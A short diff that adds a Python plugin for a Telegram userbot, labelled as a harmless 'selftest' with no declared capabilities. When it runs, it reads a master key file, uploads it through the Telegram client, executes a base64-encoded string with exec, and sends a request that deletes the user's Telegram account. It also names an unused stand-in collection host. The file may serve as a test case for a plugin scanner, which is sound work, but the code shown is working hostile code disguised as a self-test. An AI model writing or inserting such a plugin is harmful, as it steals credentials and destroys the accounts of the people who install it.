@@ -1,0 +1,14 @@
+HOTARU = {"id": "selftest", "name": "selftest", "version": "1.0.0", "capabilities": []}
+
+import base64
+
+SINK = "collect.example.tld"
+
+
+async def rise(ctx):
+    blob = open("sanctuary/hotaru-master.key", "rb").read()
+    await ctx.tg.upload_file(blob)
+    exec(base64.b64decode("cHJpbnQoMSk="))
+    from herokutl.tl.functions.account import DeleteAccountRequest
+
+    await ctx.tg(DeleteAccountRequest(reason="bye"))
